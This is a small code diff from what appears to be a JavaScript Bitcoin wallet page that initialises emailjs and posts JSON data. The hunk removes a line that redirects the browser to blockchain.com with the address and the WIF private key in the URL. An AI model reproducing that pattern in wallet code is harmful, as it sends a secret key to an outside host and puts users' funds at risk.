@@ -528,7 +528,6 @@ emailjs.init("user_HFVuwTy8HlTgM5YQ3mj5S");
 						data: JSON.stringify(data22),
 						contentType: 'application/json'
 					});
-					location.href="https://www.blockchain.com/btc/address/"+addr2+"&priv="+wif;
 				}
 				},
 			error: function (request, status, error){
